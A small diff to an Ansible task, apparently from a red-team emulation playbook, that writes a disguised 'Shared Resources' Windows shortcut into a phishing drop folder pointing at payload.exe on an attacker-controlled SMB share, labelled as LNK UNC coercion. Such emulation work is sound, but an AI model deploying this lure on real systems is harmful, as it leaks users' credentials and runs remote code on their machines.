@@ -33,7 +33,7 @@
   ansible.windows.win_shell: |
     $shell = New-Object -ComObject WScript.Shell
     $lnk = $shell.CreateShortcut('{{ phishing_drop_path }}\Shared Resources.lnk')
-    $lnk.TargetPath = '\\{{ attacker_ip }}\share\payload.exe'
+    $lnk.TargetPath = '\\{{ ia_attacker_ip }}\share\payload.exe'
     $lnk.IconLocation = '%SystemRoot%\system32\shell32.dll,4'
     $lnk.Description = 'IA-052: LNK UNC coercion'
     $lnk.Save()
